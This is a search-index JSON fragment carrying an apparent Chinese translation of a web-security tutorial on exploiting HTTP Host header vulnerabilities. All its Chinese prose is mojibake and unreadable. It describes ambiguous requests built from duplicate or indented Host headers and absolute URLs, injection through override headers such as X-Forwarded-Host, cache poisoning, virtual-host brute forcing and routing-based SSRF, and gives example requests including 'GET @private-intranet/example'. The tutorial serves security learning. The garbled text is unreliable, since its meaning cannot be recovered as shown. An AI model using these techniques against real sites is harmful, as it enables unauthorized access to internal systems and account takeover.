æœ‰å…³å¸¸è§åŸŸåéªŒè¯ç¼ºé™·çš„è¿›ä¸€æ­¥ç¤ºä¾‹ï¼Œè¯·æŸ¥çœ‹æˆ‘ä»¬æœ‰å…³è§„é¿å¸¸è§çš„ SSRF é˜²å¾¡å’Œ Origin æ ‡å¤´è§£æé”™è¯¯çš„å†…å®¹ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:1:2","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"å‘é€ä¸æ˜ç¡®çš„è¯·æ±‚ éªŒè¯ Host çš„ä»£ç å’Œæ˜“å—æ”»å‡»çš„ä»£ç é€šå¸¸åœ¨åº”ç”¨ç¨‹åºçš„ä¸åŒç»„ä»¶ä¸­ï¼Œç”šè‡³ä½äºä¸åŒçš„æœåŠ¡å™¨ä¸Šã€‚é€šè¿‡è¯†åˆ«å’Œåˆ©ç”¨å®ƒä»¬å¤„ç† Host å¤´çš„æ–¹å¼ä¸Šçš„å·®å¼‚ï¼Œä½ å¯ä»¥å‘å‡ºä¸€ä¸ªæ¨¡æ£±ä¸¤å¯çš„è¯·æ±‚ã€‚ ä»¥ä¸‹æ˜¯å‡ ä¸ªç¤ºä¾‹ï¼Œè¯´æ˜å¦‚ä½•åˆ›å»ºæ¨¡æ£±ä¸¤å¯çš„è¯·æ±‚ã€‚ æ³¨å…¥é‡å¤çš„ Host å¤´ ä¸€ç§å¯èƒ½çš„æ–¹æ³•æ˜¯å°è¯•æ·»åŠ é‡å¤çš„ Host å¤´ã€‚è¯šç„¶ï¼Œè¿™é€šå¸¸åªä¼šå¯¼è‡´ä½ çš„è¯·æ±‚è¢«é˜»æ­¢ã€‚ä½†æ˜¯ï¼Œç”±äºæµè§ˆå™¨ä¸å¤ªå¯èƒ½å‘é€è¿™æ ·çš„è¯·æ±‚ï¼Œä½ å¯èƒ½ä¼šå¶å°”å‘ç°å¼€å‘äººå‘˜æ²¡æœ‰é¢„æ–™åˆ°è¿™ç§æƒ…å†µã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯èƒ½ä¼šå‘ç°ä¸€äº›æœ‰è¶£çš„è¡Œä¸ºæ€ªç™–ã€‚ ä¸åŒçš„ç³»ç»Ÿå’ŒæŠ€æœ¯å°†ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†è¿™ç§æƒ…å†µï¼Œä½†å…·ä½“ä½¿ç”¨å“ªä¸ª Host å¤´å¯èƒ½ä¼šå­˜åœ¨å·®å¼‚ï¼Œä½ å¯ä»¥åˆ©ç”¨è¿™äº›å·®å¼‚ã€‚è€ƒè™‘ä»¥ä¸‹è¯·æ±‚ï¼š GET /example HTTP/1.1 Host: vulnerable-website.com Host: bad-stuff-here å‡è®¾è½¬å‘æœåŠ¡ä¼˜å…ˆä½¿ç”¨ç¬¬ä¸€ä¸ªæ ‡å¤´ï¼Œä½†æ˜¯åç«¯æœåŠ¡å™¨ä¼˜å…ˆä½¿ç”¨æœ€åä¸€ä¸ªæ ‡å¤´ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ä½¿ç”¨ç¬¬ä¸€ä¸ªæŠ¥å¤´æ¥ç¡®ä¿ä½ çš„è¯·æ±‚è¢«è·¯ç”±åˆ°é¢„æœŸçš„ç›®æ ‡ï¼Œå¹¶ä½¿ç”¨ç¬¬äºŒä¸ªæŠ¥å¤´å°†ä½ çš„æœ‰æ•ˆè´Ÿè½½ä¼ é€’åˆ°æœåŠ¡ç«¯ä»£ç ä¸­ã€‚ æä¾›ä¸€ä¸ªç»å¯¹çš„ URL åœ°å€ è™½ç„¶è¯·æ±‚è¡Œé€šå¸¸æ˜¯æŒ‡å®šè¯·æ±‚åŸŸä¸Šçš„ç›¸å¯¹è·¯å¾„ï¼Œä½†è®¸å¤šæœåŠ¡å™¨ä¹Ÿè¢«é…ç½®ä¸ºç†è§£ç»å¯¹ URL åœ°å€çš„è¯·æ±‚ã€‚ åŒæ—¶æä¾›ç»å¯¹ URL å’Œ Host å¤´æ‰€å¼•èµ·çš„æ­§ä¹‰ä¹Ÿå¯èƒ½å¯¼è‡´ä¸åŒç³»ç»Ÿä¹‹é—´çš„å·®å¼‚ã€‚è§„èŒƒè€Œè¨€ï¼Œåœ¨è·¯ç”±è¯·æ±‚æ—¶ï¼Œåº”ä¼˜å…ˆè€ƒè™‘è¯·æ±‚è¡Œï¼Œä½†å®é™…ä¸Šå¹¶éæ€»æ˜¯å¦‚æ­¤ã€‚ä½ å¯ä»¥åƒé‡å¤ Host å¤´ä¸€æ ·åˆ©ç”¨è¿™äº›å·®å¼‚ã€‚ GET https://vulnerable-website.com/ HTTP/1.1 Host: bad-stuff-here è¯·æ³¨æ„ï¼Œä½ å¯èƒ½è¿˜éœ€è¦å°è¯•ä¸åŒçš„åè®®ã€‚å¯¹äºè¯·æ±‚è¡Œæ˜¯åŒ…å« HTTP è¿˜æ˜¯ HTTPS URLï¼ŒæœåŠ¡å™¨çš„è¡Œä¸ºæœ‰æ—¶ä¼šæœ‰æ‰€ä¸åŒã€‚ æ·»åŠ  line wrapping ä½ è¿˜å¯ä»¥ç»™ HTTP å¤´æ·»åŠ ç©ºæ ¼ç¼©è¿›ï¼Œä»è€Œå‘ç°å¥‡æ€ªçš„è¡Œä¸ºã€‚æœ‰äº›æœåŠ¡å™¨ä¼šå°†ç¼©è¿›çš„æ ‡å¤´è§£é‡Šä¸ºæ¢è¡Œï¼Œå› æ­¤å°†å…¶è§†ä¸ºå‰ä¸€ä¸ªæ ‡å¤´å€¼çš„ä¸€éƒ¨åˆ†ã€‚è€Œå…¶ä»–æœåŠ¡å™¨å°†å®Œå…¨å¿½ç•¥ç¼©è¿›çš„æ ‡å¤´ã€‚ ç”±äºå¯¹è¯¥åœºæ™¯çš„å¤„ç†æä¸ä¸€è‡´ï¼Œå¤„ç†ä½ çš„è¯·æ±‚çš„ä¸åŒç³»ç»Ÿä¹‹é—´é€šå¸¸ä¼šå­˜åœ¨å·®å¼‚ã€‚è€ƒè™‘ä»¥ä¸‹è¯·æ±‚ï¼š GET /example HTTP/1.1 Host: bad-stuff-here Host: vulnerable-website.com ç½‘ç«™å¯èƒ½ä¼šé˜»æ­¢å…·æœ‰å¤šä¸ª Host æ ‡å¤´çš„è¯·æ±‚ï¼Œä½†æ˜¯ä½ å¯ä»¥é€šè¿‡ç¼©è¿›å…¶ä¸­ä¸€ä¸ªæ¥ç»•è¿‡æ­¤éªŒè¯ã€‚å¦‚æœè½¬å‘æœåŠ¡å¿½ç•¥ç¼©è¿›çš„æ ‡å¤´ï¼Œåˆ™è¯·æ±‚ä¼šè¢«å½“åšè®¿é—® vulnerable-website.com çš„æ™®é€šè¯·æ±‚ã€‚ç°åœ¨è®©æˆ‘ä»¬å‡è®¾åç«¯å¿½ç•¥å‰å¯¼ç©ºæ ¼ï¼Œå¹¶åœ¨å‡ºç°é‡å¤çš„æƒ…å†µä¸‹ä¼˜å…ˆå¤„ç†ç¬¬ä¸€ä¸ªæ ‡å¤´ï¼Œè¿™æ—¶ä½ å°±å¯ä»¥é€šè¿‡ â€œwrappedâ€ Host å¤´ä¼ é€’ä»»æ„å€¼ã€‚ å…¶ä»–æŠ€æœ¯ è¿™åªæ˜¯å‘å¸ƒæœ‰å®³ä¸”æ¨¡æ£±ä¸¤å¯çš„è¯·æ±‚çš„è®¸å¤šå¯èƒ½æ–¹æ³•ä¸­çš„ä¸€å°éƒ¨åˆ†ã€‚ä¾‹å¦‚ï¼Œä½ è¿˜å¯ä»¥é‡‡ç”¨ HTTP è¯·æ±‚èµ°ç§æŠ€æœ¯æ¥æ„é€  Host å¤´æ”»å‡»ã€‚è¯·æ±‚èµ°ç§çš„è¯¦ç»†å†…å®¹è¯·æŸ¥çœ‹è¯¥ä¸»é¢˜æ–‡ç« ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:1:3","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"æ³¨å…¥è¦†ç›– Host çš„æ ‡å¤´ å³ä½¿ä¸èƒ½ä½¿ç”¨ä¸æ˜ç¡®çš„è¯·æ±‚é‡å†™ Host å¤´ï¼Œä¹Ÿæœ‰å…¶ä»–åœ¨ä¿æŒå…¶å®Œæ•´çš„åŒæ—¶é‡å†™å…¶å€¼çš„å¯èƒ½ã€‚è¿™åŒ…æ‹¬é€šè¿‡å…¶ä»–çš„ HTTP Host æ ‡å¤´æ³¨å…¥æœ‰æ•ˆè´Ÿè½½ï¼Œè¿™äº›æ ‡å¤´çš„è®¾è®¡å°±æ˜¯ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ã€‚ æ­£å¦‚æˆ‘ä»¬å·²ç»è®¨è®ºè¿‡çš„ï¼Œç½‘ç«™é€šå¸¸æ˜¯é€šè¿‡æŸç§ä¸­ä»‹ç³»ç»Ÿè®¿é—®çš„ï¼Œæ¯”å¦‚è´Ÿè½½å‡è¡¡å™¨æˆ–åå‘ä»£ç†ã€‚åœ¨è¿™ç§æ¶æ„ä¸­ï¼Œåç«¯æœåŠ¡å™¨æ¥æ”¶åˆ°çš„ Host å¤´å¯èƒ½æ˜¯è¿™äº›ä¸­é—´ç³»ç»Ÿçš„åŸŸåã€‚è¿™é€šå¸¸ä¸è¯·æ±‚çš„åŠŸèƒ½æ— å…³ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå‰ç«¯æœåŠ¡å™¨ï¼ˆè½¬å‘æœåŠ¡ï¼‰å¯ä»¥æ³¨å…¥ X-Forwarded-Host å¤´æ¥æ ‡æ˜å®¢æˆ·ç«¯åˆå§‹è¯·æ±‚çš„ Host çš„åŸå§‹å€¼ã€‚å› æ­¤ï¼Œå½“ X-Forwarded-Host å­˜åœ¨æ—¶ï¼Œè®¸å¤šæ¡†æ¶ä¼šå¼•ç”¨å®ƒã€‚å³ä½¿æ²¡æœ‰å‰ç«¯ä½¿ç”¨æ­¤æ ‡å¤´ï¼Œä¹Ÿå¯ä»¥è§‚å¯Ÿåˆ°è¿™ç§è¡Œä¸ºã€‚ ä½ æœ‰æ—¶å¯ä»¥ç”¨ X-Forwarded-Host ç»•è¿‡ Host å¤´çš„ä»»ä½•éªŒè¯çš„å¹¶æ³¨å…¥æ¶æ„è¾“å…¥ã€‚ GET /example HTTP/1.1 Host: vulnerable-website.com X-Forwarded-Host: bad-stuff-here å°½ç®¡ X-Forwarded-Host æ˜¯æ­¤è¡Œä¸ºçš„å®é™…æ ‡å‡†ï¼Œä½ å¯èƒ½ä¹Ÿä¼šé‡åˆ°å…¶ä»–å…·æœ‰ç±»ä¼¼ç”¨é€”çš„æ ‡å¤´ï¼ŒåŒ…æ‹¬ï¼š X-Host X-Forwarded-Server X-HTTP-Host-Override Forwarded ä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰äº›ç½‘ç«™ï¼Œç”šè‡³å¯èƒ½æ˜¯ä½ è‡ªå·±çš„ç½‘ç«™ï¼Œæ— æ„ä¸­æ”¯æŒè¿™ç§è¡Œä¸ºã€‚è¿™é€šå¸¸æ˜¯å› ä¸ºåœ¨å®ƒä»¬ä½¿ç”¨çš„æŸäº›ç¬¬ä¸‰æ–¹æŠ€æœ¯ä¸­ï¼Œè¿™äº›æŠ¥å¤´ä¸­çš„ä¸€ä¸ªæˆ–å¤šä¸ªæ˜¯é»˜è®¤å¯ç”¨çš„ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:1:4","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"å¦‚ä½•åˆ©ç”¨ HTTP Host å¤´ ä¸€æ—¦ç¡®å®šå¯ä»¥å‘ç›®æ ‡åº”ç”¨ç¨‹åºä¼ é€’ä»»æ„ä¸»æœºåï¼Œå°±å¯ä»¥å¼€å§‹å¯»æ‰¾åˆ©ç”¨å®ƒçš„æ–¹æ³•ã€‚ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†æä¾›ä¸€äº›ä½ å¯ä»¥æ„é€ çš„å¸¸è§ HTTP Host å¤´æ”»å‡»çš„ç¤ºä¾‹ã€‚ å¯†ç é‡ç½®ä¸­æ¯’ Web ç¼“å­˜ä¸­æ¯’ åˆ©ç”¨å…¸å‹çš„æœåŠ¡å™¨ç«¯æ¼æ´ ç»•è¿‡èº«ä»½éªŒè¯ è™šæ‹Ÿä¸»æœºæš´åŠ›ç ´è§£ åŸºäºè·¯ç”±çš„ SSRF ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:2:0","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"å¯†ç é‡ç½®ä¸­æ¯’ æ”»å‡»è€…æœ‰æ—¶å¯ä»¥ä½¿ç”¨ Host å¤´è¿›è¡Œå¯†ç é‡ç½®ä¸­æ¯’æ”»å‡»ã€‚æ›´å¤šå†…å®¹å‚è§æœ¬ç³»åˆ—ç›¸å…³éƒ¨åˆ†ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:2:1","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"é€šè¿‡ Host å¤´çš„ Web ç¼“å­˜ä¸­æ¯’ åœ¨æ¢æµ‹æ½œåœ¨çš„ Host å¤´æ”»å‡»æ—¶ï¼Œä½ ç»å¸¸ä¼šé‡åˆ°çœ‹ä¼¼æ˜“å—æ”»å‡»ä½†å¹¶ä¸èƒ½ç›´æ¥åˆ©ç”¨çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½ä¼šå‘ç° Host å¤´åœ¨æ²¡æœ‰ HTML ç¼–ç çš„æƒ…å†µä¸‹åæ˜ åœ¨å“åº”æ ‡è®°ä¸­ï¼Œç”šè‡³ç›´æ¥ç”¨äºè„šæœ¬å¯¼å…¥ã€‚åå°„çš„å®¢æˆ·ç«¯æ¼æ´ï¼ˆä¾‹å¦‚ XSS ï¼‰ç”± Host æ ‡å¤´å¼•èµ·æ—¶é€šå¸¸æ— æ³•åˆ©ç”¨ã€‚æ”»å‡»è€…æ²¡æ³•å¼ºè¿«å—å®³è€…çš„æµè§ˆå™¨è¯·æ±‚ä¸æ­£ç¡®çš„ä¸»æœºã€‚ ä½†æ˜¯ï¼Œå¦‚æœç›®æ ‡ä½¿ç”¨äº† web ç¼“å­˜ï¼Œåˆ™å¯ä»¥é€šè¿‡ç¼“å­˜å‘å…¶ä»–ç”¨æˆ·æä¾›ä¸­æ¯’å“åº”ï¼Œå°†è¿™ä¸ªæ— ç”¨çš„ã€åå°„çš„æ¼æ´è½¬å˜ä¸ºå±é™©çš„å­˜å‚¨æ¼æ´ã€‚ è¦æ„å»º web ç¼“å­˜ä¸­æ¯’æ”»å‡»ï¼Œéœ€è¦ä»æœåŠ¡å™¨è·å–åæ˜ å·²æ³¨å…¥è´Ÿè½½çš„å“åº”ã€‚ä¸ä»…å¦‚æ­¤ï¼Œä½ è¿˜éœ€è¦æ‰¾åˆ°å…¶ä»–ç”¨æˆ·è¯·æ±‚ä¹ŸåŒæ—¶ä½¿ç”¨çš„ç¼“å­˜é”®ã€‚å¦‚æœæˆåŠŸï¼Œä¸‹ä¸€æ­¥æ˜¯ç¼“å­˜æ­¤æ¶æ„å“åº”ã€‚ç„¶åï¼Œå®ƒå°†è¢«æä¾›ç»™ä»»ä½•è¯•å›¾è®¿é—®å—å½±å“é¡µé¢çš„ç”¨æˆ·ã€‚ ç‹¬ç«‹ç¼“å­˜é€šå¸¸åœ¨ç¼“å­˜é”®ä¸­åŒ…å« Host å¤´ï¼Œå› æ­¤è¿™ç§æ–¹æ³•é€šå¸¸åœ¨é›†æˆçš„åº”ç”¨ç¨‹åºçº§ç¼“å­˜ä¸Šæœ€æœ‰æ•ˆã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‰é¢è®¨è®ºçš„æŠ€æœ¯æœ‰æ—¶ç”šè‡³å¯ä»¥æ¯’å®³ç‹¬ç«‹çš„ web ç¼“å­˜ç³»ç»Ÿã€‚ Web ç¼“å­˜ä¸­æ¯’æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ä¸“é¢˜è®¨è®ºã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:2:2","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"åˆ©ç”¨å…¸å‹çš„æœåŠ¡ç«¯æ¼æ´ æ¯ä¸ª HTTP å¤´éƒ½æ˜¯åˆ©ç”¨å…¸å‹æœåŠ¡ç«¯æ¼æ´çš„æ½œåœ¨è½½ä½“ï¼ŒHost å¤´ä¹Ÿä¸ä¾‹å¤–ã€‚ä¾‹å¦‚ï¼Œä½ å¯ä»¥é€šè¿‡ Host å¤´æ¢æµ‹è¯•è¯•å¹³å¸¸çš„ SQL æ³¨å…¥ã€‚å¦‚æœ Host çš„å€¼è¢«ä¼ é€’åˆ° SQL è¯­å¥ä¸­ï¼Œè¿™å¯èƒ½æ˜¯å¯åˆ©ç”¨çš„ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:2:3","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"è®¿é—®å—é™åŠŸèƒ½ æŸäº›ç½‘ç«™åªå…è®¸å†…éƒ¨ç”¨æˆ·è®¿é—®æŸäº›åŠŸèƒ½ã€‚ä½†æ˜¯ï¼Œè¿™äº›ç½‘ç«™çš„è®¿é—®æ§åˆ¶å¯èƒ½ä¼šåšå‡ºé”™è¯¯çš„å‡è®¾ï¼Œå…è®¸ä½ é€šè¿‡å¯¹ Host å¤´è¿›è¡Œç®€å•çš„ä¿®æ”¹æ¥ç»•è¿‡è¿™äº›é™åˆ¶ã€‚è¿™ä¼šæˆä¸ºå…¶ä»–æ”»å‡»çš„åˆ‡å…¥ç‚¹ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:2:4","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"æš´åŠ›ç ´è§£ä½¿ç”¨è™šæ‹Ÿä¸»æœºçš„å†…éƒ¨ç½‘ç«™ å…¬å¸æœ‰æ—¶ä¼šçŠ¯è¿™æ ·çš„é”™è¯¯ï¼šåœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šæ‰˜ç®¡å¯å…¬å¼€è®¿é—®çš„ç½‘ç«™å’Œç§æœ‰çš„å†…éƒ¨ç½‘ç«™ã€‚æœåŠ¡å™¨é€šå¸¸æœ‰ä¸€ä¸ªå…¬å…±çš„å’Œä¸€ä¸ªç§æœ‰çš„ IP åœ°å€ã€‚ç”±äºå†…éƒ¨ä¸»æœºåå¯èƒ½ä¼šè§£æä¸ºç§æœ‰çš„ IP åœ°å€ï¼Œå› æ­¤ä»…é€šè¿‡æŸ¥çœ‹ DNS è®°å½•æ— æ³•æ£€æµ‹åˆ°è¿™ç§æƒ…å†µï¼š www.example.com:12.34.56.78 intranet.example.com:10.0.0.132 åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå†…éƒ¨ç«™ç‚¹ç”šè‡³å¯èƒ½æ²¡æœ‰ä¸ä¹‹å…³è”çš„å…¬å¼€ DNS è®°å½•ã€‚å°½ç®¡å¦‚æ­¤ï¼Œæ”»å‡»è€…é€šå¸¸å¯ä»¥è®¿é—®ä»–ä»¬æœ‰æƒè®¿é—®çš„ä»»ä½•æœåŠ¡å™¨ä¸Šçš„ä»»ä½•è™šæ‹Ÿä¸»æœºï¼Œå‰ææ˜¯ä»–ä»¬èƒ½å¤ŸçŒœå‡ºä¸»æœºåã€‚å¦‚æœä»–ä»¬é€šè¿‡å…¶ä»–æ–¹å¼å‘ç°äº†éšè—çš„åŸŸåï¼Œæ¯”å¦‚ä¿¡æ¯æ³„æ¼ï¼Œä»–ä»¬å°±å¯ä»¥ç›´æ¥å‘èµ·è¯·æ±‚ã€‚å¦åˆ™ï¼Œä»–ä»¬åªèƒ½ä½¿ç”¨è¯¸å¦‚ Burp intruiter è¿™æ ·çš„å·¥å…·ï¼Œé€šè¿‡å€™é€‰å­åŸŸçš„ç®€å•å•è¯è¡¨å¯¹è™šæ‹Ÿä¸»æœºè¿›è¡Œæš´åŠ›ç ´è§£ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:2:5","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"åŸºäºè·¯ç”±çš„ SSRF æœ‰æ—¶è¿˜å¯èƒ½ä½¿ç”¨ Host å¤´å‘èµ·é«˜å½±å“ã€åŸºäºè·¯ç”±çš„ SSRF æ”»å‡»ã€‚è¿™æœ‰æ—¶è¢«ç§°ä¸º â€œHost header SSRF attacksâ€ ã€‚ ç»å…¸çš„ SSRF æ¼æ´é€šå¸¸åŸºäº XXE æˆ–å¯åˆ©ç”¨çš„ä¸šåŠ¡é€»è¾‘ï¼Œè¯¥é€»è¾‘å°† HTTP è¯·æ±‚å‘é€åˆ°ä»ç”¨æˆ·å¯æ§åˆ¶çš„è¾“å…¥æ´¾ç”Ÿçš„ URL ã€‚å¦ä¸€æ–¹é¢ï¼ŒåŸºäºè·¯ç”±çš„ SSRF ä¾èµ–äºåˆ©ç”¨åœ¨è®¸å¤šåŸºäºäº‘çš„æ¶æ„ä¸­æµè¡Œçš„ä¸­é—´ç»„ä»¶ã€‚è¿™åŒ…æ‹¬å†…éƒ¨è´Ÿè½½å‡è¡¡å™¨å’Œåå‘ä»£ç†ã€‚ å°½ç®¡è¿™äº›ç»„ä»¶éƒ¨ç½²çš„ç›®çš„ä¸åŒï¼Œä½†åŸºæœ¬ä¸Šï¼Œå®ƒä»¬éƒ½ä¼šæ¥æ”¶è¯·æ±‚å¹¶å°†å…¶è½¬å‘åˆ°é€‚å½“çš„åç«¯ã€‚å¦‚æœå®ƒä»¬è¢«ä¸å®‰å…¨åœ°é…ç½®ï¼Œè½¬å‘æœªéªŒè¯ Host å¤´çš„è¯·æ±‚ï¼Œå®ƒä»¬å°±å¯èƒ½è¢«æ“çºµä»¥å°†è¯·æ±‚é”™è¯¯åœ°è·¯ç”±åˆ°æ”»å‡»è€…é€‰æ‹©çš„ä»»æ„ç³»ç»Ÿã€‚ è¿™äº›ç³»ç»Ÿæ˜¯å¾ˆå¥½çš„ç›®æ ‡ï¼Œå®ƒä»¬å¤„äºä¸€ä¸ªç‰¹æƒç½‘ç»œä½ç½®ï¼Œè¿™ä½¿å®ƒä»¬å¯ä»¥ç›´æ¥ä»å…¬å…±ç½‘ç»œæ¥æ”¶è¯·æ±‚ï¼ŒåŒæ—¶è¿˜å¯ä»¥è®¿é—®è®¸å¤šã€ä½†ä¸æ˜¯å…¨éƒ¨çš„å†…éƒ¨ç½‘ç»œã€‚è¿™ä½¿å¾— Host å¤´æˆä¸º SSRF æ”»å‡»çš„å¼ºå¤§è½½ä½“ï¼Œæœ‰å¯èƒ½å°†ä¸€ä¸ªç®€å•çš„è´Ÿè½½å‡è¡¡å™¨è½¬æ¢ä¸ºé€šå‘æ•´ä¸ªå†…éƒ¨ç½‘ç»œçš„ç½‘å…³ã€‚ ä½ å¯ä»¥ä½¿ç”¨ Burp Collaborator æ¥å¸®åŠ©è¯†åˆ«è¿™äº›æ¼æ´ã€‚å¦‚æœä½ åœ¨ Host å¤´ä¸­æä¾› Collaborator æœåŠ¡å™¨çš„åŸŸï¼Œå¹¶ä¸”éšåä»ç›®æ ‡æœåŠ¡å™¨æˆ–å…¶ä»–è·¯å¾„å†…çš„ç³»ç»Ÿæ”¶åˆ°äº† DNS æŸ¥è¯¢ï¼Œåˆ™è¡¨æ˜ä½ å¯ä»¥å°†è¯·æ±‚è·¯ç”±åˆ°ä»»æ„åŸŸã€‚ åœ¨ç¡®è®¤å¯ä»¥æˆåŠŸåœ°æ“çºµä¸­ä»‹ç³»ç»Ÿä»¥å°†è¯·æ±‚è·¯ç”±åˆ°ä»»æ„å…¬å…±æœåŠ¡å™¨ä¹‹åï¼Œä¸‹ä¸€æ­¥æ˜¯æŸ¥çœ‹èƒ½å¦åˆ©ç”¨æ­¤è¡Œä¸ºè®¿é—®å†…éƒ¨ç³»ç»Ÿã€‚ä¸ºæ­¤ï¼Œä½ éœ€è¦æ ‡è¯†åœ¨ç›®æ ‡å†…éƒ¨ç½‘ç»œä¸Šä½¿ç”¨çš„ç§æœ‰ IP åœ°å€ã€‚é™¤äº†åº”ç”¨ç¨‹åºæ³„æ¼çš„ IP åœ°å€å¤–ï¼Œä½ è¿˜å¯ä»¥æ‰«æå±äºè¯¥å…¬å¸çš„ä¸»æœºåï¼Œä»¥æŸ¥çœ‹æ˜¯å¦æœ‰è§£æä¸ºç§æœ‰ IP åœ°å€çš„æƒ…å†µã€‚å¦‚æœå…¶ä»–æ–¹æ³•éƒ½å¤±è´¥äº†ï¼Œä½ ä»ç„¶å¯ä»¥é€šè¿‡ç®€å•åœ°å¼ºåˆ¶ä½¿ç”¨æ ‡å‡†ç§æœ‰ IP èŒƒå›´ï¼ˆä¾‹å¦‚ 192.168.0.0/16 ï¼‰æ¥è¯†åˆ«æœ‰æ•ˆçš„ IP åœ°å€ã€‚ é€šè¿‡æ ¼å¼é”™è¯¯çš„è¯·æ±‚è¡Œè¿›è¡Œ SSRF è‡ªå®šä¹‰ä»£ç†æœ‰æ—¶æ— æ³•æ­£ç¡®åœ°éªŒè¯è¯·æ±‚è¡Œï¼Œè¿™å¯èƒ½ä¼šä½¿ä½ æä¾›å¼‚å¸¸çš„ã€æ ¼å¼é”™è¯¯çš„è¾“å…¥ï¼Œä»è€Œå¸¦æ¥ä¸å¹¸çš„ç»“æœã€‚ ä¾‹å¦‚ï¼Œåå‘ä»£ç†å¯èƒ½ä»è¯·æ±‚è¡Œè·å–è·¯å¾„ï¼Œç„¶ååŠ ä¸Šäº†å‰ç¼€ http://backend-serverï¼Œå¹¶å°†è¯·æ±‚è·¯ç”±åˆ°ä¸Šæ¸¸ URL ã€‚å¦‚æœè·¯å¾„ä»¥ / å¼€å¤´ï¼Œè¿™æ²¡æœ‰é—®é¢˜ï¼Œä½†å¦‚æœä»¥ @ å¼€å¤´å‘¢ï¼Ÿ GET @private-intranet/example HTTP/1.1 æ­¤æ—¶ï¼Œä¸Šæ¸¸çš„ URL å°†æ˜¯ http://backend-server@private-intranet/exampleï¼Œå¤§å¤šæ•° HTTP åº“å°†è®¤ä¸ºè®¿é—®çš„æ˜¯ private-intranet ä¸”ç”¨æˆ·åæ˜¯ backend-serverã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/:2:6","tags":[],"title":"Exploiting HTTP Host header vulnerabilities","uri":"/translation/web-security/http-host-header-attacks/exploiting-http-host-header-vulnerabilities/"},{"categories":["web security"],"content":"Password reset poisoning","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/password-reset-poisoning/","tags":[],"title":"Password reset poisoning","uri":"/translation/web-security/http-host-header-attacks/password-reset-poisoning/"},{"categories":["web security"],"content":"Password reset poisoning å¯†ç é‡ç½®ä¸­æ¯’æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æŠ€æœ¯æ¥æ“çºµæ˜“å—æ”»å‡»çš„ç½‘ç«™ï¼Œä»¥ç”ŸæˆæŒ‡å‘å…¶æ§åˆ¶ä¸‹çš„åŸŸçš„å¯†ç é‡ç½®é“¾æ¥ã€‚è¿™ç§è¡Œä¸ºå¯ä»¥ç”¨æ¥çªƒå–é‡ç½®ä»»æ„ç”¨æˆ·å¯†ç æ‰€éœ€çš„ç§˜å¯†ä»¤ç‰Œï¼Œå¹¶æœ€ç»ˆå±å®³ä»–ä»¬çš„å¸æˆ·ã€‚ ","date":"2021-03-06","objectID":"/translation/web-security/http-host-header-attacks/password-reset-poisoning/:0:0","tags":[],"title":"Password reset poisoning","uri":"/translation/web-security/http-host-header-attacks/password-reset-poisoning/"},{"categories":["web security"],"content":"å¯†ç é‡ç½®æ˜¯å¦‚ä½•å·¥ä½œçš„ å‡ ä¹æ‰€æœ‰éœ€è¦ç™»å½•çš„ç½‘ç«™éƒ½å®ç°äº†å…è®¸ç”¨æˆ·åœ¨å¿˜è®°å¯†ç æ—¶é‡ç½®å¯†ç 